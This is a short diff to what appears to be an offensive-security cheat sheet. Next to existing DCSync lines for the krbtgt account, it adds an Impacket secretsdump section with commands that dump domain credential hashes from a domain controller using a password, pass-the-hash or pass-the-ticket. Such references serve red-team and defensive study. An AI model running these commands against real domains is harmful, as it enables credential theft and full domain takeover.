@@ -55,6 +55,19 @@ dcsync_ntlm krbtgt
 dcsync krbtgt
 ```
 
+### Impacket secretsdump
+
+```text
+# using a plaintext password
+secretsdump -outputfile 'something' 'DOMAIN'/'USER':'PASSWORD'@'DOMAINCONTROLLER'
+​
+# with Pass-the-Hash
+secretsdump -outputfile 'something' -hashes 'LMhash':'NThash' 'DOMAIN'/'USER'@'DOMAINCONTROLLER'
+​
+# with Pass-the-Ticket
+secretsdump -k -outputfile 'something' 'DOMAIN'/'USER'@'DOMAINCONTROLLER'
+```
+
 
 
 
